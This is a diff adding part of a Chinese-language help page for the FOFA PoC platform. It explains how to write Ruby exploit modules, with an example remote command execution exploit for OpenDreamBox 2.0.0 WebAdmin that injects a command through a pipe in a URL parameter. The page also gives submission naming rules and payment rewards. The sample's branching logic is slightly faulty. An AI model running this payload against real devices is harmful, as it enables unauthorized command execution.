+勾选漏洞验证后，添加完参数，会在FOFA PoC 的get_info函数生成以下json字段，对应我们填写的参数名称和值。</p>
+<pre>
+	<code>
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "name": "cmd",
+                  "type": "textarea",
+                  "value": "whoami"
+            }
+      ]
+	</code>
+</pre>
+<p>案例如下：<strong>OpenDreamBox 2.0.0 - Plugin WebAdmin 远程命令执行</strong> </p>
+<pre>
+	<code>
+ def exploit(hostinfo)
+    host, port = hostinfo.split(":")
+    http = Net::HTTP.new(host, port)
+    http.open_timeout = 10
+    cmd = fetch_cfg('cmd')
+    path = "/webadmin/script?command=|#{cmd}"
+    resp = http.get(path)
+    out = { "state": 1, "progress": 30, "output": "", "error": "" }
+    puts out.to_json
+    body = resp.body.force_encoding('UTF-8')
+    if body&&body.empty?
+      out = { "state": 3, "progress": 100, "output": body, "error": "failed" }
+      puts out.to_json
+    else body.include? "bin/sh: /usr/script/: Permission denied"
+      out = { "state": 2, "progress": 100, "output": body, "error": "failed" }
+      puts out.to_json
+    end
+    {}
+	</code>
+</pre>
+<p>编写exploit模块的时候，用 <strong>cmd = fetch_cfg('cmd')</strong> 接收json中的ExpParams中命令参数的值。
+页面中需要返回一个json，确保fofascan不会出错。返回的结果可根据实际情况渲染、匹配正确的结果。</p>
+<pre>
+    out = { "state": 1, "progress": 30, "output": "", "error": "" }	
+</pre>
+<p>json的格式说明，<strong>&quot;state&quot;：&quot;1&quot;</strong> 表示命令执行中，<strong>&quot;state&quot;：&quot;2&quot;</strong> 表示执行完成，<strong>&quot;state&quot;：&quot;3&quot;</strong> 表示执行失败。
+后续版本会完善漏洞利用模块，在客户端展示，目前仅支持命令行利用。</p>
+<p><strong>展示效果如下：</strong>
+<img src="../images/help/image9.png" /></p>
+<h1>FOFA PoC提交</h1>
+<ol>
+<li>
+<p>文件名中不能含有除a-z(所有小写英文字母) A-Z(所有大写英文字母) _(下划线) .(英文句号)意外的任何字符。</p>
+</li>
+<li>
+<p>保存的文件名应以<strong>“产品名_漏洞文件名_漏洞名.rb”</strong> 的格式保存，例如：<strong>WordPress core.php文件 sql注入<strong>，则文件名应为</strong>Wordpress_core.php_sqli.rb</strong></p>
+</li>
+</ol>
+<hr />
+<h1>FOFA PoC奖励</h1>
+<ul>
+<li>
+<p>一个PoC审核通过之后获得首次奖励，奖励额为PoC的价格。</p>
+</li>
+<li>
+<p>有企业购买PoC之后可获得二次奖励，奖励额为PoC价格的50%。</p>
+</li>
+</ul>
+<hr />
+<h1>FOFA PoC扫描</h1>
+<ul>
+<li>
+<p>需要进行实名认证，认证步骤：</p>
+<ol>
+<li>
+<p>登陆<a href="javascript:">FOFA.SO</a>-&gt;个人中心-&gt;财务中心-&gt;银行卡-&gt;添加银行卡，绑定银行卡。</p>
+</li>
+<li>
+<p>提交<strong>身份证正反面</strong>、<strong>手持身份证照片<strong>至</strong>service@baimaohui.net</strong> </p>
+</li>
+</ol>
+</li>
+</ul>
+<hr />
+
+</body>
+
+</html>
+<script>
